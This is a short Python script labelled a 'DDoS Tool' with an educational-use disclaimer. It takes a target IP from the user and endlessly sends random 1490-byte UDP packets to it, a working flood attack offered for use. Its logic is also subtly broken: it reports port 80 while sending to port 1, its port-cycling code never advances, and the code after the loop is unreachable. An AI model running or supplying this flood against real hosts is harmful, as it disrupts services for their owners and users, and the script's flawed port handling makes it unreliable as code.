# THIS TOOL IS FOR EDUCATIONAL PURPOSES ONLY
import os
import time
import socket
import random

print()
print('    | DDoS Tool by → copy-and-execute (github.com/copy-and-execute/)')
print('    | → This tool is only for educational purposes. Do not use this for illegal purposes.')
print('    | → You are responsible for all actions you perform with this code/tool.')

mydate = time.strftime('%Y-%m-%d')
mytime = time.strftime('%H-%M')
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
ip = input("    | Target IP → ")
print("    | Attacking on →", ip, "...")

time.sleep(2.5)
sent = 0
while True:
    sock.sendto(bytes, (ip, 1))
    sent = sent + 1
    port = 80 # You can edit your attacking port here
    print("    | Sent Packet → %s through %s:%s" % (sent, ip, port))
    if port == 65534:
        port = 1

os.system("cls")
input("Press Enter to exit...")
